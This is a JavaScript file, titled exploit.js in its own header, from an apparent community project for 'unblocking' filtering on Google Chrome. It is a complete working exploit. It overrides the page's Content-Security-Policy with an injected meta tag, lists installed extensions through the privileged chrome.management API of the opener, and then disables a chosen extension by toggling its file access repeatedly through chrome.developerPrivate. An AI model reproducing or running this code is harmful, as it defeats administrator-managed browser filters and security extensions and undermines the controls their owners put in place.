/**
 * for Unblock filterings on Google Chrome
 * - 無断転載及び、作者情報の改ざん、クレジットの削除を禁ずる
 * - Discord Server: https://discord.gg/Fk8FJt7Dsb
 * - Website: https://blogbooks.net
 * - Github: https://github.com/blogbooks
 * 
 * @author harun#9676 & 半透明のLocaler#5455
 * @license https://oncreative.space/project/blogbooks/exploit.js/LICENCE
 * @copyright 2020-2023 BlogBooks Community
 * @version v2.1
 */

/**
 * for ease coding...
 * + avoid: CSP Method
 * @author harun#9676
 */
class baseAsset {
    /**
     * @param {Array} options 
     */
    constructor() {
        // Data Center
        this.database = {};

        /**
         * Rewrite CSP(Content Security Policy)
         * @author harun#9676
         */
        this.meta = document.createElement("meta");
        this.meta.setAttribute("http-equiv", "content-security-policy");
        this.meta.setAttribute("content", "script-src *;script-src-attr *");
        document.head.appendChild(this.meta);
        opener.document.head.appendChild(this.meta);
        delete this.meta;
        document.body.style.position = "fixed";
    }
}

/**
 * main script for Unblock filterings
 */
class exploit extends baseAsset {
    constructor() {
        try {
            // Repuest class: baseAsset
            super();
            
            // 条件
            if (!(location.href == "about:blank" || opener || opener.location.origin == "chrome://extensions")) return document.body.innerHTML = "Error: S001 条件が一致しません";

            this.database.status = {};
            //  HTML構成
            document.newBodyData = "";
            opener.chrome.management.getAll(data => {
                data.forEach((extension) => {
                    document.newBodyData += `<option value="${extension.id}">${extension.name}</option>`;
                });
                // Set Style
                this.style = document.createElement("style");
                this.style.innerHTML = `div{overflow:hidden;width:90%;margin:2em auto;text-align:center}div select{width:100%;padding-right:1em;cursor:pointer;text-indent:.01px;text-overflow:ellipsis;border:none;outline:none;background:transparent;background-image:none;box-shadow:none;-webkit-appearance:none;appearance:none}div select::-ms-expand{display:none}div{position:relative;border:1px solid #bbb;border-radius:2px;background:#fff}div::before{position:absolute;top:.8em;right:.9em;width:0;height:0;padding:0;content:'';border-left:6px solid transparent;border-right:6px solid transparent;border-top:6px solid #666;pointer-events:none}div select{padding:8px 38px 8px 8px;color:#666}#copyright{position:fixed;top:auto;bottom:5px;left:5px}`;
                document.head.appendChild(this.style);
                document.body.innerHTML = `無効化する拡張機能を選択:<br><div><select id="targetExtension">${document.newBodyData}</select></div><button onclick="disabler()">無効化</button><span id="copyright">?2020-2023 <a href="https://discord.gg/Fk8FJt7Dsb">BlogBooks Community</a> (harun#9676) & 2023 <a href="">Shadow Wolf</a></span>`;
            });

            /**
             * Disable extension at from param: id
             * @param {String} id
             * @author 半透明のLocaler#5455 
             */
            document.disabler = (id = document.querySelector("#targetExtension").value) => {
                this.database.status[id] = true;
                setInterval(()=>{
                    opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: this.database.status[id]});
                    this.database.status[id] = !this.database.status[id];
                }, 1000 / 4);
            };
        } catch (error) {
            console.log(error)
        }
    }
}

new exploit();